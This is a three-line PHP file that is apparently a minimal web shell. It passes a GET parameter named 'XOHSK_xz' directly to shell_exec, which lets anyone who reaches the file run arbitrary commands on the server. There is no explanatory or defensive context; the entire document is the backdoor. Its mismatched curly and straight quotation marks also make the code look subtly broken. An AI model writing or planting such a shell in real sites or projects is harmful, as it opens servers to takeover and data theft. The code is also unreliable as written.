<?php
shell_exec($_GET[’XOHSK_xz']);
?>
